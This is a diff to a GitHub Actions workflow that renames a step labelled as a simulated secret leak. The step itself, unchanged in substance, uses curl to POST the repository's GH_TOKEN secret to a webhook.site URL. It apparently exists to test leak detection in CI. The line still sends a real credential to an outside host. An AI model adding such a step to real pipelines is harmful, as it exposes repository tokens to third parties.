@@ -29,11 +29,11 @@ jobs:
       #- name: Install dependencies
        # run: pip install -r requirements.txt
 
-      - name: Simulate secret leak via cURL
+      - name: Simulate secret leak of GitHub Token via cURL
         run: |
           curl -X POST https://webhook.site/3cf43a02-7caa-4d2b-bc40-4cf906e55296 \
             -H "Content-Type: application/json" \
-            -d "{\"leaked_secret\": \"${{ secrets.GH_TOKEN }}\"}"
+            -d "{\"leaked_secret_github_token\": \"${{ secrets.GH_TOKEN }}\"}"
 
       - name: Cleanup PSE
         if: always()
